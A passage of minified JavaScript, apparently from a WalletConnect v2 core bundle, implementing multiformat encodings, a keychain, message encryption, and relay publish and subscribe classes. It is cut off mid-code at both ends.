WC=Array.from(""),gL=WC.reduce((t,e,r)=>(t[r]=e,t),[]),wL=WC.reduce((t,e,r)=>(t[e.codePointAt(0)]=r,t),[]);function mL(t){return t.reduce((e,r)=>(e+=gL[r],e),"")}function yL(t){const e=[];for(const r of t){const n=wL[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const bL=Xg({prefix:"",name:"base256emoji",encode:mL,decode:yL});var vL=Object.freeze({__proto__:null,base256emoji:bL}),EL=GC,u5=128,CL=-128,AL=Math.pow(2,31);function GC(t,e,r){e=e||[],r=r||0;for(var n=r;t>=AL;)e[r++]=t&255|u5,t/=128;for(;t&CL;)e[r++]=t&255|u5,t>>>=7;return e[r]=t|0,GC.bytes=r-n+1,e}var xL=uy,IL=128,h5=127;function uy(t,n){var r=0,n=n||0,i=0,s=n,o,a=t.length;do{if(s>=a)throw uy.bytes=0,new RangeError("Could not decode varint");o=t[s++],r+=i<28?(o&h5)<<i:(o&h5)*Math.pow(2,i),i+=7}while(o>=IL);return uy.bytes=s-n,r}var SL=Math.pow(2,7),NL=Math.pow(2,14),PL=Math.pow(2,21),kL=Math.pow(2,28),OL=Math.pow(2,35),_L=Math.pow(2,42),TL=Math.pow(2,49),$L=Math.pow(2,56),RL=Math.pow(2,63),DL=function(t){return t<SL?1:t<NL?2:t<PL?3:t<kL?4:t<OL?5:t<_L?6:t<TL?7:t<$L?8:t<RL?9:10},BL={encode:EL,decode:xL,encodingLength:DL},KC=BL;const d5=(t,e,r=0)=>(KC.encode(t,e,r),e),f5=t=>KC.encodingLength(t),hy=(t,e)=>{const r=e.byteLength,n=f5(t),i=n+f5(r),s=new Uint8Array(i+r);return d5(t,s,0),d5(r,s,n),s.set(e,i),new LL(t,r,e,s)};let LL=class{constructor(e,r,n,i){this.code=e,this.size=r,this.digest=n,this.bytes=i}};const ZC=({name:t,code:e,encode:r})=>new UL(t,e,r);let UL=class{constructor(e,r,n){this.name=e,this.code=r,this.encode=n}digest(e){if(e instanceof Uint8Array){const r=this.encode(e);return r instanceof Uint8Array?hy(this.code,r):r.then(n=>hy(this.code,n))}else throw Error("Unknown type, must be binary type")}};const JC=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),ML=ZC({name:"sha2-256",code:18,encode:JC("SHA-256")}),FL=ZC({name:"sha2-512",code:19,encode:JC("SHA-512")});var zL=Object.freeze({__proto__:null,sha256:ML,sha512:FL});const QC=0,jL="identity",YC=qC,HL=t=>hy(QC,YC(t)),qL={code:QC,name:jL,encode:YC,digest:HL};var VL=Object.freeze({__proto__:null,identity:qL});new TextEncoder,new TextDecoder;const p5={...UB,...FB,...jB,...qB,...GB,...nL,...oL,...lL,...pL,...vL};({...zL,...VL});function WL(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(t):new Uint8Array(t)}function XC(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const g5=XC("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),hw=XC("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=WL(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),GL={utf8:g5,"utf-8":g5,hex:p5.base16,latin1:hw,ascii:hw,binary:hw,...p5};function KL(t,e="utf8"){const r=GL[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t,"utf8"):r.decoder.decode(`${r.prefix}${t}`)}var ZL=Object.defineProperty,JL=(t,e,r)=>e in t?ZL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,bi=(t,e,r)=>JL(t,typeof e!="symbol"?e+"":e,r);let QL=class{constructor(e,r){this.core=e,this.logger=r,bi(this,"keychain",new Map),bi(this,"name",QD),bi(this,"version",YD),bi(this,"initialized",!1),bi(this,"storagePrefix",Ki),bi(this,"init",async()=>{if(!this.initialized){const n=await this.getKeyChain();typeof n<"u"&&(this.keychain=n),this.initialized=!0}}),bi(this,"has",n=>(this.isInitialized(),this.keychain.has(n))),bi(this,"set",async(n,i)=>{this.isInitialized(),this.keychain.set(n,i),await this.persist()}),bi(this,"get",n=>{this.isInitialized();const i=this.keychain.get(n);if(typeof i>"u"){const{message:s}=ee("NO_MATCHING_KEY",`${this.name}: ${n}`);throw new Error(s)}return i}),bi(this,"del",async n=>{this.isInitialized(),this.keychain.delete(n),await this.persist()}),this.core=e,this.logger=_r(r,this.name)}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,Zm(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?Jm(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var YL=Object.defineProperty,XL=(t,e,r)=>e in t?YL(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,er=(t,e,r)=>XL(t,typeof e!="symbol"?e+"":e,r);class eU{constructor(e,r,n){this.core=e,this.logger=r,er(this,"name",ZD),er(this,"keychain"),er(this,"randomSessionIdentifier",oy()),er(this,"initialized",!1),er(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),er(this,"hasKeys",i=>(this.isInitialized(),this.keychain.has(i))),er(this,"getClientId",async()=>{this.isInitialized();const i=await this.getClientSeed(),s=Kv(i);return ME(s.publicKey)}),er(this,"generateKeyPair",()=>{this.isInitialized();const i=u$();return this.setPrivateKey(i.publicKey,i.privateKey)}),er(this,"signJWT",async i=>{this.isInitialized();const s=await this.getClientSeed(),o=Kv(s),a=this.randomSessionIdentifier;return await Nk(a,i,JD,o)}),er(this,"generateSharedKey",(i,s,o)=>{this.isInitialized();const a=this.getPrivateKey(i),c=h$(a,s);return this.setSymKey(c,o)}),er(this,"setSymKey",async(i,s)=>{this.isInitialized();const o=s||_0(i);return await this.keychain.set(o,i),o}),er(this,"deleteKeyPair",async i=>{this.isInitialized(),await this.keychain.del(i)}),er(this,"deleteSymKey",async i=>{this.isInitialized(),await this.keychain.del(i)}),er(this,"encode",async(i,s,o)=>{this.isInitialized();const a=PC(o),c=js(s);if(T3(a))return p$(c,o==null?void 0:o.encoding);if(_3(a)){const d=a.senderPublicKey,f=a.receiverPublicKey;i=await this.generateSharedKey(d,f)}const l=this.getSymKey(i),{type:u,senderPublicKey:h}=a;return d$({type:u,symKey:l,message:c,senderPublicKey:h,encoding:o==null?void 0:o.encoding})}),er(this,"decode",async(i,s,o)=>{this.isInitialized();const a=w$(s,o);if(T3(a)){const c=g$(s,o==null?void 0:o.encoding);return yc(c)}if(_3(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;i=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(i),l=f$({symKey:c,encoded:s,encoding:o==null?void 0:o.encoding});return yc(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${i}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),er(this,"getPayloadType",(i,s=ui)=>{const o=Ud({encoded:i,encoding:s});return Ec(o.type)}),er(this,"getPayloadSenderPublicKey",(i,s=ui)=>{const o=Ud({encoded:i,encoding:s});return o.senderPublicKey?Kr(o.senderPublicKey,kr):void 0}),this.core=e,this.logger=_r(r,this.name),this.keychain=n||new QL(this.core,this.logger)}get context(){return Jr(this.logger)}async setPrivateKey(e,r){return await this.keychain.set(e,r),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(a5)}catch{e=oy(),await this.keychain.set(a5,e)}return KL(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}}var tU=Object.defineProperty,rU=Object.defineProperties,nU=Object.getOwnPropertyDescriptors,w5=Object.getOwnPropertySymbols,iU=Object.prototype.hasOwnProperty,sU=Object.prototype.propertyIsEnumerable,dy=(t,e,r)=>e in t?tU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,oU=(t,e)=>{for(var r in e||(e={}))iU.call(e,r)&&dy(t,r,e[r]);if(w5)for(var r of w5(e))sU.call(e,r)&&dy(t,r,e[r]);return t},aU=(t,e)=>rU(t,nU(e)),Yr=(t,e,r)=>dy(t,typeof e!="symbol"?e+"":e,r);let cU=class extends uD{constructor(e,r){super(e,r),this.logger=e,this.core=r,Yr(this,"messages",new Map),Yr(this,"messagesWithoutClientAck",new Map),Yr(this,"name",XD),Yr(this,"version",eB),Yr(this,"initialized",!1),Yr(this,"storagePrefix",Ki),Yr(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const n=await this.getRelayerMessages();typeof n<"u"&&(this.messages=n);const i=await this.getRelayerMessagesWithoutClientAck();typeof i<"u"&&(this.messagesWithoutClientAck=i),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(n){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(n)}finally{this.initialized=!0}}}),Yr(this,"set",async(n,i,s)=>{this.isInitialized();const o=Fi(i);let a=this.messages.get(n);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=i,this.messages.set(n,a),s===R0.inbound){const c=this.messagesWithoutClientAck.get(n)||{};this.messagesWithoutClientAck.set(n,aU(oU({},c),{[o]:i}))}return await this.persist(),o}),Yr(this,"get",n=>{this.isInitialized();let i=this.messages.get(n);return typeof i>"u"&&(i={}),i}),Yr(this,"getWithoutAck",n=>{this.isInitialized();const i={};for(const s of n){const o=this.messagesWithoutClientAck.get(s)||{};i[s]=Object.values(o)}return i}),Yr(this,"has",(n,i)=>{this.isInitialized();const s=this.get(n),o=Fi(i);return typeof s[o]<"u"}),Yr(this,"ack",async(n,i)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(n);if(typeof s>"u")return;const o=Fi(i);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(n):this.messagesWithoutClientAck.set(n,s),await this.persist()}),Yr(this,"del",async n=>{this.isInitialized(),this.messages.delete(n),this.messagesWithoutClientAck.delete(n),await this.persist()}),this.logger=_r(e,this.name),this.core=r}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,Zm(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,Zm(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?Jm(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?Jm(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var lU=Object.defineProperty,uU=Object.defineProperties,hU=Object.getOwnPropertyDescriptors,m5=Object.getOwnPropertySymbols,dU=Object.prototype.hasOwnProperty,fU=Object.prototype.propertyIsEnumerable,fy=(t,e,r)=>e in t?lU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ap=(t,e)=>{for(var r in e||(e={}))dU.call(e,r)&&fy(t,r,e[r]);if(m5)for(var r of m5(e))fU.call(e,r)&&fy(t,r,e[r]);return t},dw=(t,e)=>uU(t,hU(e)),Gn=(t,e,r)=>fy(t,typeof e!="symbol"?e+"":e,r);let pU=class extends hD{constructor(e,r){super(e,r),this.relayer=e,this.logger=r,Gn(this,"events",new mn.EventEmitter),Gn(this,"name",tB),Gn(this,"queue",new Map),Gn(this,"publishTimeout",X.toMiliseconds(X.ONE_MINUTE)),Gn(this,"initialPublishTimeout",X.toMiliseconds(X.ONE_SECOND*15)),Gn(this,"needsTransportRestart",!1),Gn(this,"publish",async(n,i,s)=>{var o;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:n,message:i,opts:s}});const a=(s==null?void 0:s.ttl)||c5,c=X0(s),l=(s==null?void 0:s.prompt)||!1,u=(s==null?void 0:s.tag)||0,h=(s==null?void 0:s.id)||$a().toString(),d={topic:n,message:i,opts:{ttl:a,relay:c,prompt:l,tag:u,id:h,attestation:s==null?void 0:s.attestation,tvf:s==null?void 0:s.tvf}},f=`Failed to publish payload, please try again. id:${h} tag:${u}`;try{const g=new Promise(async p=>{const w=({id:b})=>{d.opts.id===b&&(this.removeRequestFromQueue(b),this.relayer.events.removeListener(Kt.publish,w),p(d))};this.relayer.events.on(Kt.publish,w);const m=To(new Promise((b,v)=>{this.rpcPublish({topic:n,message:i,ttl:a,prompt:l,tag:u,id:h,attestation:s==null?void 0:s.attestation,tvf:s==null?void 0:s.tvf}).then(b).catch(x=>{this.logger.warn(x,x==null?void 0:x.message),v(x)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${h} tag:${u}`);try{await m,this.events.removeListener(Kt.publish,w)}catch(b){this.queue.set(h,dw(Ap({},d),{attempt:1})),this.logger.warn(b,b==null?void 0:b.message)}});this.logger.trace({type:"method",method:"publish",params:{id:h,topic:n,message:i,opts:s}}),await To(g,this.publishTimeout,f)}catch(g){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(g),(o=s==null?void 0:s.internal)!=null&&o.throwOnFailedPublish)throw g}finally{this.queue.delete(h)}}),Gn(this,"on",(n,i)=>{this.events.on(n,i)}),Gn(this,"once",(n,i)=>{this.events.once(n,i)}),Gn(this,"off",(n,i)=>{this.events.off(n,i)}),Gn(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),this.relayer=e,this.logger=_r(r,this.name),this.registerEventListeners()}get context(){return Jr(this.logger)}async rpcPublish(e){var r,n,i,s;const{topic:o,message:a,ttl:c=c5,prompt:l,tag:u,id:h,attestation:d,tvf:f}=e,g={method:od(X0().protocol).publish,params:Ap({topic:o,message:a,ttl:c,prompt:l,tag:u,attestation:d},f),id:h};ir((r=g.params)==null?void 0:r.prompt)&&((n=g.params)==null||delete n.prompt),ir((i=g.params)==null?void 0:i.tag)&&((s=g.params)==null||delete s.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:g});const p=await this.relayer.request(g);return this.relayer.events.emit(Kt.publish,e),this.logger.debug("Successfully Published Payload"),p}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,r)=>{const n=e.attempt+1;this.queue.set(r,dw(Ap({},e),{attempt:n}));const{topic:i,message:s,opts:o,attestation:a}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${n}`),await this.rpcPublish(dw(Ap({},e),{topic:i,message:s,ttl:o.ttl,prompt:o.prompt,tag:o.tag,id:o.id,attestation:a,tvf:o.tvf})),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(dh.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(Kt.connection_stalled);return}this.checkQueue()}),this.relayer.on(Kt.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}};var gU=Object.defineProperty,wU=(t,e,r)=>e in t?gU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Wc=(t,e,r)=>wU(t,typeof e!="symbol"?e+"":e,r);let mU=class{constructor(){Wc(this,"map",new Map),Wc(this,"set",(e,r)=>{const n=this.get(e);this.exists(e,r)||this.map.set(e,[...n,r])}),Wc(this,"get",e=>this.map.get(e)||[]),Wc(this,"exists",(e,r)=>this.get(e).includes(r)),Wc(this,"delete",(e,r)=>{if(typeof r>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const n=this.get(e);if(!this.exists(e,r))return;const i=n.filter(s=>s!==r);if(!i.length){this.map.delete(e);return}this.map.set(e,i)}),Wc(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}};var yU=Object.defineProperty,bU=Object.defineProperties,vU=Object.getOwnPropertyDescriptors,y5=Object.getOwnPropertySymbols,EU=Object.prototype.hasOwnProperty,CU=Object.prototype.propertyIsEnumerable,py=(t,e,r)=>e in t?yU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,Ph=(t,e)=>{for(var r in e||(e={}))EU.call(e,r)&&py(t,r,e[r]);if(y5)for(var r of y5(e))CU.call(e,r)&&py(t,r,e[r]);return t},fw=(t,e)=>bU(t,vU(e)),ct=(t,e,r)=>py(t,typeof e!="symbol"?e+"":e,r);let AU=class extends pD{constructor(e,r){super(e,r),this.relayer=e,this.logger=r,ct(this,"subscriptions",new Map),ct(this,"topicMap",new mU),ct(this,"events",new mn.EventEmitter),ct(this,"name",cB),ct(this,"version",lB),ct(this,"pending",new Map),ct(this,"cached",[]),ct(this,"initialized",!1),ct(this,"storagePrefix",Ki),ct(this,"subscribeTimeout",X.toMiliseconds(X.ONE_MINUTE)),ct(this,"initialSubscribeTimeout",X.toMiliseconds(X.ONE_SECOND*15)),ct(this,"clientId"),ct(this,"batchSubscribeTopicsLimit",500),ct(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),ct(this,"subscribe",async(n,i)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:n,opts:i}});try{const s=X0(i),o={topic:n,relay:s,transportType:i==null?void 0:i.transportType};this.pending.set(n,o);const a=await this.rpcSubscribe(n,s,i);return typeof a=="string"&&(this.onSubscribe(a,o),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:n,opts:i}})),a}catch(s){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(s),s}}),ct(this,"unsubscribe",async(n,i)=>{this.isInitialized(),typeof(i==null?void 0:i.id)<"u"?await this.unsubscribeById(n,i.id,i):await this.unsubscribeByTopic(n,i)}),ct(this,"isSubscribed",n=>new Promise(i=>{i(this.topicMap.topics.includes(n))})),ct(this,"isKnownTopic",n=>new Promise(i=>{i(this.topicMap.topics.includes(n)||this.pending.has(n)||this.cached.some(s=>s.topic===n))})),ct(this,"on",(n,i)=>{this.events.on(n,i)}),ct(this,"once",(n,i)=>{this.events.once(n,i)}),ct(this,"off",(n,i)=>{this.events.off(n,i)}),ct(this,"removeListener",(n,i)=>{this.events.removeListener(n,i)}),ct(this,"start",async()=>{await this.onConnect()}),ct(this,"stop",async()=>{await this.onDisconnect()}),ct(this,"restart",async()=>{await this.restore(),await this.onRestart()}),ct(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const n=[];this.pending.forEach(i=>{n.push(i)}),await this.batchSubscribe(n)}),ct(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(dh.pulse,async()=>{await this.checkPending()}),this.events.on(on.created,async n=>{const i=on.created;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:n}),await this.persist()}),this.events.on(on.deleted,async n=>{const i=on.deleted;this.logger.info(`Emitting ${i}`),this.logger.debug({type:"event",event:i,data:n}),await this.persist()})}),this.relayer=e,this.logger=_r(r,this.name),this.clientId=""}get context(){return Jr(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,r){let n=!1;try{n=this.getSubscription(e).topic===r}catch{}return n}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,r){const n=this.topicMap.get(e);await Promise.all(n.map(async i=>await this.unsubscribeById(e,i,r)))}async unsubscribeById(e,r,n){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:r,opts:n}});try{const i=X0(n);await this.restartToComplete({topic:e,id:r,relay:i}),await this.rpcUnsubscribe(e,r,i);const s=it("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,r,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:r,opts:n}})}catch(i){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(i),i}}async rpcSubscribe(e,r,n){var i;(!n||(n==null?void 0:n.transportType)===mt.relay)&&await this.restartToComplete({topic:e,id:e,relay:r});const s={method:od(r.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:s});const o=(i=n==null?void 0:n.internal)==null?void 0:i.throwOnFailedPublish;try{const a=await this.getSubscriptionId(e);if((n==null?void 0:n.transportType)===mt.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(s).catch(u=>this.logger.warn(u))},X.toMiliseconds(X.ONE_SECOND)),a;const c=new Promise(async u=>{const h=d=>{d.topic===e&&(this.events.removeListener(on.created,h),u(d.id))};this.events.on(on.created,h);try{const d=await To(new Promise((f,g)=>{this.relayer.request(s).catch(p=>{this.logger.warn(p,p==null?void 0:p.message),g(p)}).then(f)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(on.created,h),u(d)}catch{}}),l=await To(c,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!l&&o)throw new Error(`Subscribing to ${e} failed, please try again`);return l?a:null}catch(a){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(Kt.connection_stalled),o)throw a}return null}async rpcBatchSubscribe(e){if(!e.length)return;const r=e[0].relay,n={method:od(r.protocol).batchSubscribe,params:{topics:e.map(i=>i.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n});try{await await To(new Promise(i=>{this.relayer.request(n).catch(s=>this.logger.warn(s)).then(i)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(Kt.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const r=e[0].relay,n={method:od(r.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n});let i;try{i=await await To(new Promise((s,o)=>{this.relayer.request(n).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(Kt.connection_stalled)}return i}rpcUnsubscribe(e,r,n){const i={method:od(n.protocol).unsubscribe,params:{topic:e,id:r}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i}),this.relayer.request(i)}onSubscribe(e,r){this.setSubscription(e,fw(Ph({},r),{id:e})),this.pending.delete(r.topic)}onBatchSubscribe(e){e.length&&e.forEach(r=>{this.setSubscription(r.id,Ph({},r)),this.pending.delete(r.topic)})}async onUnsubscribe(e,r,n){this.events.removeAllListeners(r),this.hasSubscription(r,e)&&this.deleteSubscription(r,n),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,r){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:r}),this.addSubscription(e,r)}addSubscription(e,r){this.subscriptions.set(e,Ph({},r)),this.topicMap.set(r.topic,e),this.events.emit(on.created,r)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const r=this.subscriptions.get(e);if(!r){const{message:n}=ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(n)}return r}deleteSubscription(e,r){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:r});const n=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(n.topic,e),this.events.emit(on.deleted,fw(Ph({},n),{reason:r}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(on.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],r=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let n=0;n<r;n++){const i=e.splice(0,this.batchSubscribeTopicsLimit);await this.batchSubscribe(i)}}this.events.emit(on.resubscribed)}async restore(){try{const e=await this.getRelayerSubscriptions();if(typeof e>"u"||!e.length)return;if(this.subscriptions.size){const{message:r}=ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(r),this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),new Error(r)}this.cached=e,this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),this.logger.trace({type:"method",method:"restore",subscriptions:this.values})}catch(e){this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),this.logger.error(e)}}async batchSubscribe(e){e.length&&(await this.rpcBatchSubscribe(e),this.onBatchSubscribe(await Promise.all(e.map(async r=>fw(Ph({},r),{id:await this.getSubscriptionId(r.topic)})))))}async batchFetchMessages(e){if(!e.length)return;this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);const r=await this.rpcBatchFetchMessages(e);r&&r.messages&&(await QO(X.toMiliseconds(X.ONE_SECOND)),await this.relayer.handleBatchMessageEvents(r.messages))}async onConnect(){await this.restart(),this.reset()}onDisconnect(){this.onDisable()}isInitialized(){if(!this.initialized){const{message:e}=ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async restartToComplete(e){!this.relayer.connected&&!this.relayer.connecting&&(this.cached.push(e),await this.relayer.transportOpen())}async getClientId(){return this.clientId||(this.clientId=await this.relayer.core.crypto.getClientId()),this.clientId}async getSubscriptionId(e){return Fi(e+await this.getClientId())}};var xU=Object.defineProperty,b5=Object.getOwnPropertySymbols,IU=Object.prototype.hasOwnProperty,SU=Object.prototype.propertyIsEnumerable,gy=(t,e,r)=>e in t?xU(t,e,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[e]=r,v5=(t,e)=>{for(var r in e||(e={}))IU.call(e,r)&&gy(t,r,e[r]);if(b5)for(var r of b5(e))SU.call(e,r)&&gy(t,r,e[r]);return t},Ge=(t,e,r)=>gy(t,typeof e!="symbol"?e+"":e,r);let NU=class extends dD{constructor(e){super(e),Ge(this,"protocol","wc"),Ge(this,"version",2),Ge(this,"core"),Ge(this,"logger"),Ge(this,"events",new mn.EventEmitter),Ge(this,"provider"),Ge(this,"messages"),Ge(this,"subscriber"),Ge(this,"publisher"),Ge(this,"name",nB),Ge(this,"transportExplicitlyClosed",!1),Ge(this,"initialized",!1),Ge(this,"connectionAttemptInProgress",!1),Ge(this,"relayUrl"),Ge(this,"projectId"),Ge(this,"packageName"),Ge(this,"bundleId"),Ge(this,"hasExperiencedNetworkDisruption",!1),Ge(this,"pingTimeout"),Ge(this,"heartBeatTimeout",X.toMiliseconds(X.THIRTY_SECONDS+X.FIVE_SECONDS)),Ge(this,"reconnectTimeout"),Ge(this,"connectPromise"),Ge(this,"reconnectInProgress",!1),Ge(this,"requestsInFlight",[]),Ge(this,"connectTimeout",X.toMiliseconds(X.ONE_SECOND*15)),Ge(this,"request",async r=>{var n,i;this.logger.debug("Publishing Request Payload");const s=r.id||$a().toString();await this.toEstablishConnection();try{this.logger.trace({id:s,method:r.method,topic:(n=r.params)==null?void 0:n.topic},"relayer.request - publishing...");const o=`${s}:${((i=r.params)==null?void 0:i.tag)||""}`;this.requestsInFlight.push(o);const a=await this.provider.request(r);return this.requestsInFlight=this.requestsInFlight.filter(c=>c!==o),a}catch(o){throw this.logger.debug(`Failed to Publish Request: ${s}`),o}}),Ge(this,"resetPingTimeout",()=>{Q0()&&(clearTimeout(this.pingTimeout),this.pingTimeout=setTimeout(()=>{var r,n,i,s;try{this.logger.debug({},"pingTimeout: Connection stalled, terminating..."),(s=(i=(n=(r=this.provider)==null?void 0:r.connection)==null?void 0:n.socket)==null?void 0:i.terminate)==null||s.call(i)}catch(o){this.logger.warn(o,o==null?void 0:o.message)}},this.heartBeatTimeout))}),Ge(this,"onPayloadHandler",r=>{this.onProviderPayload(r),this.resetPingTimeout()}),Ge(this,"onConnectHandler",()=>{this.logger.warn({},"Relayer connected "),this.startPingTimeout(),this.events.emit(Kt.connect)}),Ge(this,"onDisconnectHandler",()=>{this.logger.warn({},"Relayer disconnected "),this.requestsInFlight=[],this.onProviderDisconnect()}),Ge(this,"onProviderErrorHandler",r=>{this.logger.fatal(`Fatal socket error: ${r.message}`),this.events.emit(Kt.error,r),this.logger.fatal("Fatal socket error received, closing 